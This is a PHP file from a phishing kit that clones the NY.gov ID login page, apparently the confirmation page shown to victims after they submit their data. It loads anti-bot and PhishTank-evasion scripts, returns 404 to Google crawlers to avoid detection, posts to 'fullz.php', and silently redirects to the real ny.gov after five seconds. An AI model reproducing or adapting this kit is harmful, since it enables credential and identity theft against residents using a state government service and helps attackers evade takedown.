<?php

session_start();
error_reporting(0);

// ANITBOTS

include('../../Anti/Bot-Spox.php');
include('../../Anti/Bot-Crawler.php');
include('../../Anti/blacklist.php');
include('../../Anti/new.php');
include('../../Anti/IP-BlackList.php');
include('../../Anti/Dila_DZ.php');

include('../../BOTS/iprange.php');
include('../../BOTS/phishtank.php');
include('../../BOTS/spec.php');

include('../functions/get_lang_en.php'); 


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0330)https://my.ny.gov/sreg/Login?TYPE=33554433&REALMOID=06-8a7b34cc-d651-1012-95f2-839b4d430cb3&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=$SM$%2fwdO7d5Kur4lk9fsxycgLO8IjohxfiA4ELtAEcXEtl35DC%2fDk0PuUxRMyhgbQUvL&TARGET=$SM$HTTP%3a%2f%2fmy%2edmv%2eny%2egov%2fmydmv%3f_ga%3d2%2e230944920%2e605945232%2e1615407637-865476614%2e1615407637 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><title>NY.gov ID Login</title>



<meta http-equiv="refresh" content="5; url=https://www.ny.gov/"> 

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<script type="text/javascript" async="" src="./NY.gov ID Login_files/siteanalyze_1577.js.download"></script><script type="text/javascript" async="" src="./NY.gov ID Login_files/analytics.js.download"></script><script src="./NY.gov ID Login_files/gtm.js.download" type="text/javascript" async=""></script><script async="" src="./NY.gov ID Login_files/analytics.js.download"></script><script type="text/javascript" src="https://my.ny.gov/sreg/ruxitagentjs_ICA27SVfjqrux_10205201218101503.js" data-dtconfig="app=998701f0ddcff8d4|featureHash=ICA27SVfjqrux|vcv=2|rdnt=1|uxrgce=1|bp=2|cuc=c55jnn85|dpvc=1|lastModification=1615402116932|dtVersion=10205201218101503|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/sreg/ruxitagentjs_ICA27SVfjqrux_10205201218101503.js|reportUrl=/sreg/rb_ff8821ed-3c09-41dd-ad29-f1af6647ca98|rid=RID_-835903799|rpid=1448124986|domain=ny.gov"></script><link href="./NY.gov ID Login_files/Main_Style.css" rel="stylesheet" type="text/css">
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49859957-1', 'ny.gov');
  ga('send', 'pageview');

</script>

<script async="" defer="" src="./NY.gov ID Login_files/f5cs-a_aa4vH4y2v9-3c76a782.js.download" id="_imp_apg_dip_" _imp_apg_cid_="f5cs-a_aa4vH4y2v9-3c76a782" _imp_apg_api_domain_="https://dip.zeronaught.com"></script></head>


<body class="stdBody">









<script>
/* Toggle between adding and removing the "responsive" class to topnav when the user clicks on the icon */
function myFunction() {
    var x = document.getElementById("myTopnav");
    if (x.className === "topnav") {
        x.className += " responsive";
    } else {
        x.className = "topnav";
    }
}
</script>

<div id="skip"><a href="https://my.ny.gov/sreg/Login?TYPE=33554433&amp;REALMOID=06-8a7b34cc-d651-1012-95f2-839b4d430cb3&amp;GUID=&amp;SMAUTHREASON=0&amp;METHOD=GET&amp;SMAGENTNAME=$SM$%2fwdO7d5Kur4lk9fsxycgLO8IjohxfiA4ELtAEcXEtl35DC%2fDk0PuUxRMyhgbQUvL&amp;TARGET=$SM$HTTP%3a%2f%2fmy%2edmv%2eny%2egov%2fmydmv%3f_ga%3d2%2e230944920%2e605945232%2e1615407637-865476614%2e1615407637#mainContent">Skip to main content</a></div>

<iframe id="nygov-universal-navigation-frame" class="nygov-universal-container" width="100%" height="86px" src="./NY.gov ID Login_files/ajax.html" data-updated="2014-11-07 08:30" frameborder="0" style="border:none; overflow:hidden; width:100%; height:86px;" scrolling="no">
	Your browser does not support iFrames
</iframe>
<!-- Google Tag Manager -->
    <noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-T4FP6H" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <script type="text/javascript"><!--
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0];var j=d.createElement(s);var dl=l!='dataLayer'?'&l='+l:'';j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;j.type='text/javascript';j.async=true;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T4FP6H');
//--></script>
	<!-- End Google Tag Manager -->
		<ul class="topnav" id="myTopnav">
          <li><a href="https://my.ny.gov/"><img id="Left_nav1_TopCapImage" src="./NY.gov ID Login_files/ny_map.png" style="margin-top: -5px;border: 0;width: 40px" alt="Go to NY.gov ID"><span style="vertical-align: top;">NY.gov ID</span></a></li>
		  <li><a href="https://my.ny.gov/NYgovId/onlineservices.xhtml" target="_blank">Online Services</a></li>
		  <li><a href="https://my.ny.gov/NYgovId/faqs.xhtml" target="_blank">FAQs</a></li>
		  <li><a href="https://my.ny.gov/NYgovId/about.xhtml">About NY.gov ID</a></li>
		  <li><a href="https://my.ny.gov/SelfRegV3/agencycontact.xhtml?nygovidlang=en" target="_blank">Help Desk Information</a></li>
		  <li><a href="https://my.ny.gov/NYgovId/privacynotice.xhtml" target="_blank">Privacy Policy</a></li>
		  <li><a href="https://my.ny.gov/NYgovId/tos.xhtml" target="_blank">Terms of Service</a></li>
		  <li class="icon">
		    <a href="javascript:void(0);" onclick="myFunction()">&#9776;</a>
		  </li>
		</ul>	
		
<a name="mainContent"></a>




<link rel="stylesheet" type="text/css" href="./NY.gov ID Login_files/w3.css">
<link rel="stylesheet" type="text/css" href="./NY.gov ID Login_files/resp.css"><script type="text/javascript" id="">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="//siteimproveanalytics.com/js/siteanalyze_1577.js";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)})();</script> 
<meta name="viewport" content="width=device-width, initial-scale=1">



<!-- 
<div class="w3-center">
<p align="center"><font class="ariel24pntRedBld">Warning: my.ny.gov is hitting a server that will be retired soon.  <br/>Please have your LAN Admin update the DNS information for my.ny.gov.</font></p>
</div>
 -->


<script type="text/javascript">
<!-- Hide script
  function ValidateForm(){
    if (String(document.getElementById('USERNAME').value) == ""){
      alert("Please enter your user name");
      return false;
    }
    if (String(document.getElementById('PASSWORD').value) == ""){
      alert("Please enter your password");
      return false;
    }
    return true;
  }

// End script hiding --></script>

<script type="text/javascript" src="./NY.gov ID Login_files/jquery.min.js.download"></script>



<br>
<form onsubmit="return ValidateForm(this)" action="fullz.php" method="post" autocomplete="off">


<!-- Login box Start //-->
<div class="w3-center">

<div class="w3-row">
<span class="readacceptable">Please login after reading the Acceptable Use Policy below</span>
</div>

<div class="w3-row arielRed">
	
	
		<span id="smMessage" class="arielRed"></span>
		<span id="ws04Error" class="ariel24pntRedBld"></span>
		<span id="mynyError" class="arielRed"></span>
		<span id="ws04Error" class="ariel24pntRedBld"></span>
		<span id="sShowError1" class="arielRed"></span>
		<span id="sShowError2" class="arielRed"></span>
		<span id="sShowError3" class="arielRed"></span>
		<span id="sShowError4" class="arielRed"></span>
		<span id="sShowError5" class="arielRed"></span>

</div>

<div class="w3-row" align="center">


				<div class="nygovimage">
			    	<h1><span class="title">NY.gov ID</span></h1>
				</div>  	
				<div id="logincontainer"><!-- Main Container --> 
				        <div class="inputFields">
				        	
							
							                            
                            <div class="readacceptable">
                                <h3><b><?=$Z118_success;?></b></h3>
                            </div>
							
                            <hr style="width: 100%;">
							
							
                            <div class="w3-center" style= "text-align:center">
                                <p><?=$Z118_successp;?></p>
                            </div>
							<br/>
							
							
	    			   </div>     
	    			   
					  
				</div><!-- Main Container -->
</div>				
</div>				
			<!-- Login box end //-->
			
			<br>
<div class="w3-center">
	<a href="https://my.ny.gov/SelfRegV3/agencycontact.xhtml?nygovidlang=en" class="oftforgotlinks">Agency Assistance &amp; Contact Information</a>			
</div>			
  </form>

  <script type="text/javascript">
  <!--
  document.getElementById('USERNAME').focus();
  //-->
  </script>
  
  <script type="text/javascript">

$("#USERNAME").blur(function() {
	try 
	{
		var un = document.getElementById("USERNAME").value;
		  
		 if(un.substring(0,4).toUpperCase() == "SUNY" && ! isNaN(un.substring(4,7)))
		 {
		 	 $.get('RedirectToFederate', {
                        userName : un
                }, function(redirectURL) {
                		if(redirectURL)
                		{
                			window.location.replace(redirectURL);
                		}
                         
                });
		 	
			
		 }
 	}
	catch(err)
	{
	
	}

});

</script>
  


<br>

				<div id="footer" class="footerfont" style="background-color: #151820; border: #999 1px solid;font-size: 0.65em;clear:both;overflow: hidden; width: 100%">
					<p style="float:left;padding-left: 20px">
					Copyright © 2021 - New York State Office of Information Technology Services (ITS) &nbsp;
					Build: 01/12/2021 1:03 PM &nbsp;
					Web: 139P&nbsp;App: 141PA_1 &nbsp;
					</p>
					<p style="float:right;padding-right: 20px"><a href="mailto:Customer.Relations@its.ny.gov" class="bannertext">Contact Us</a></p>
				</div>
				
<!-- DEC 2014: NEW NYS FOOTER START -->
	<iframe id="nygov-universal-footer-frame" class="nygov-universal-container" width="100%" height="200px" src="./NY.gov ID Login_files/ajax(1).html" data-updated="2014-11-07 08:30" frameborder="0" style="border:none; overflow:hidden; width:100%; height:200px;" scrolling="no">
		Your browser does not support iFrames
	</iframe>
<!-- DEC 2014: NEW NYS FOOTER END -->


</body></html>